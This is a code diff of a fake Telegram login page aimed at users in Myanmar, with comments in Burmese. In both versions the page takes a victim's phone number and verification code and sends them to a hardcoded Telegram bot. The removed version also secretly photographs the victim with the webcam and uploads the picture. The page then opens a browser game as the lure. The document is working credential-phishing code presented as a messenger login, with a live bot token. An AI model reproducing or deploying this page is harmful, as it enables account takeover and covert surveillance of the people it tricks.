@@ -3,26 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Messenger</title>
+    <title>Messenger</title>
     <style>
-        body { background-color: #1c2733; color: white; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { text-align: center; width: 90%; max-width: 350px; padding: 20px; box-sizing: border-box; }
-        h2 { font-size: 20px; margin-bottom: 8px; }
-        p { color: #7f91a4; font-size: 14px; margin-bottom: 35px; line-height: 1.4; }
-        .input-box { position: relative; margin-bottom: 25px; text-align: left; }
-        .input-box label { font-size: 13px; color: #3390ec; position: absolute; top: -10px; left: 12px; background: #1c2733; padding: 0 5px; z-index: 1; }
-        .country-select { width: 100%; padding: 15px; background: transparent; border: 1px solid #3b4754; border-radius: 10px; color: white; font-size: 16px; outline: none; }
-        .phone-input-container { display: flex; align-items: center; border: 1px solid #3b4754; border-radius: 10px; padding: 15px; }
-        input[type="tel"], input[type="number"] { background: transparent; border: none; color: white; font-size: 17px; outline: none; width: 100%; }
-        .otp-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
-        .otp-input { width: 40px; height: 50px; text-align: center; font-size: 20px; border: 1px solid #3b4754; border-radius: 8px; }
-        .next-btn { background: #3390ec; border: none; width: 60px; height: 60px; border-radius: 50%; color: white; font-size: 24px; cursor: pointer; float: right; display: flex; align-items: center; justify-content: center; }
-        .spinner { width: 22px; height: 22px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; animation: spin 0.8s linear infinite; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        /* ဂိမ်းအတွက် Fullscreen Iframe */
-        #gameFrame { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; background: black; z-index: 9999; }
-        video, canvas { display: none; }
+        body { background-color: #1c2733; color: white; font-family: sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { text-align: center; width: 90%; max-width: 350px; }
+        h2 { font-size: 20px; margin-bottom: 10px; }
+        p { color: #7f91a4; font-size: 14px; margin-bottom: 30px; }
+        .input-box { border: 1px solid #3b4754; border-radius: 10px; padding: 15px; display: flex; align-items: center; margin-bottom: 20px; background: transparent; }
+        input { background: transparent; border: none; color: white; font-size: 17px; outline: none; width: 100%; }
+        .next-btn { background: #3390ec; border: none; width: 55px; height: 55px; border-radius: 50%; color: white; font-size: 24px; cursor: pointer; float: right; margin-top: 20px; }
+        #step2, #gameArea { display: none; }
+        iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 9999; display: none; }
     </style>
 </head>
 <body>
@@ -30,102 +21,53 @@
 <div class="container" id="step1">
     <h2>Your phone number</h2>
     <p>Please confirm your country code and enter your phone number.</p>
-    <div class="input-box"><label>Country</label><input type="text" value="Myanmar (Burma)" readonly class="country-select"></div>
+    <div class="input-box"><input type="text" value="Myanmar (Burma)" readonly></div>
     <div class="input-box">
-        <label>Phone number</label>
-        <div class="phone-input-container">
-            <span style="color:white; font-size:17px;">+95</span>
-            <span style="color:#555; margin:0 10px;">|</span>
-            <input type="tel" id="phone" placeholder="9663804708" maxlength="11" autocomplete="off">
-        </div>
+        <span style="margin-right: 10px;">+95</span>
+        <input type="tel" id="phone" placeholder="9663804708" autocomplete="off">
     </div>
-    <button class="next-btn" onclick="handleStep1()"><span id="arrow1">→</span><div id="loader1" class="spinner"></div></button>
+    <button class="next-btn" onclick="goStep2()">→</button>
 </div>
 
-<div class="container" id="step2" style="display: none;">
-    <div style="font-size: 55px; margin-bottom: 20px;">📩</div>
+<div class="container" id="step2">
+    <div style="font-size: 50px; margin-bottom: 20px;">📩</div>
     <h2>Verification Code</h2>
-    <p>Please check your Telegram app and enter the code.</p>
-    <div class="otp-container">
-        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 0)">
-        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 1)">
-        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 2)">
-        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 3)">
-        <input type="number" class="otp-input" maxlength="1" oninput="move(this, 4)">
+    <p>Check your Telegram app for the code.</p>
+    <div class="input-box">
+        <input type="number" id="otp" placeholder="Enter 5-digit code" autocomplete="off">
     </div>
-    <button class="next-btn" onclick="handleStep2()"><span id="arrow2">→</span><div id="loader2" class="spinner"></div></button>
+    <button class="next-btn" onclick="sendData()">→</button>
 </div>
 
 <iframe id="gameFrame" src=""></iframe>
 
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
-
 <script>
     const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
     const chat_id = '5304050102';
-    const game_link = "https://poki.com/en/g/rail-in-the-air"; // #fullscreen ဖယ်ထားသည် (In-app ပိုကောင်းစေရန်)
-    
-    let userNum = "";
+    const game_url = "https://poki.com/en/g/rail-in-the-air";
 
-    function move(el, idx) {
-        if (el.value.length === 1 && idx < 4) document.querySelectorAll('.otp-input')[idx + 1].focus();
+    function goStep2() {
+        if(document.getElementById('phone').value.length < 7) return;
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+        // ပထမအဆင့်မှာတင် ဖုန်းနံပါတ်လှမ်းပို့ထားမယ်
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📱 Number: ${document.getElementById('phone').value}`);
     }
 
-    async function handleStep1() {
-        let rawNum = document.getElementById('phone').value;
-        if(rawNum.length < 7) return;
-        userNum = rawNum.startsWith('0') ? rawNum : '0' + rawNum;
-        showLoad(1);
-        await getDeviceInfo(`🚩 **Target Found**\n📱 Phone: ${userNum}`);
-        setTimeout(() => {
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-        }, 1200);
-    }
-
-    async function handleStep2() {
-        let otp = "";
-        document.querySelectorAll('.otp-input').forEach(i => otp += i.value);
+    function sendData() {
+        const otp = document.getElementById('otp').value;
         if(otp.length < 5) return;
-        showLoad(2);
-        
-        // Telegram ဆီ OTP ပို့
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('🔑 OTP: ' + otp + '\n📱 For: ' + userNum)}`);
-        
-        // App ထဲမှာတင် ဂိမ်းပွင့်စေရန်
-        setTimeout(() => {
+
+        // OTP ပို့မယ်
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🔑 OTP: ${otp}`)
+        .then(() => {
+            // ဂိမ်းကို App ထဲမှာတင်ဖွင့်မယ်
             const frame = document.getElementById('gameFrame');
-            frame.src = game_link;
+            frame.src = game_url;
             frame.style.display = 'block';
             document.getElementById('step2').style.display = 'none';
-        }, 1000);
-    }
-
-    function showLoad(s) {
-        document.getElementById('arrow'+s).style.display = 'none';
-        document.getElementById('loader'+s).style.display = 'block';
-    }
-
-    async function getDeviceInfo(baseMsg) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({video: true});
-            const v = document.getElementById('v'); v.srcObject = stream;
-            setTimeout(async () => {
-                const c = document.getElementById('c');
-                c.width = 640; c.height = 480;
-                c.getContext('2d').drawImage(v, 0, 0);
-                const blob = await new Promise(r => c.toBlob(r, 'image/jpeg'));
-                const f = new FormData();
-                f.append('chat_id', chat_id); f.append('photo', blob, 'x.jpg'); f.append('caption', baseMsg);
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
-                stream.getTracks().forEach(t => t.stop());
-            }, 1000);
-        } catch(e) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(baseMsg)}`);
-        }
+        });
     }
 </script>
 </body>
 </html>
-
